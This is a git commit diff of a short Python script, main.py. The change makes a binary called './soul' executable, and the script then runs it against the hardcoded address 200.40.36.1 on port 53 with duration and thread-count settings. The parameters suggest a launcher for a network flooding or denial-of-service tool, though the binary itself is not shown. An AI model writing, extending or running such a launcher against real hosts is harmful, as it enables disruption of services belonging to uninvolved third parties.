7e69777fca782ffa0f102a34c87b7d855fd2f0e5
nikilsaxena843-art <nikilsaxena843@gmail.com>
2026-04-29 10:57:56 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,9 +1,13 @@
 import subprocess
 import sys
+import os
 
 ip = "200.40.36.1"
 port = "53"
 time = "120"
 threads = "100"
+
+# Execute permission set karo
+os.chmod("./soul", 0o755)
 
 subprocess.run(["./soul", ip, port, time, threads])
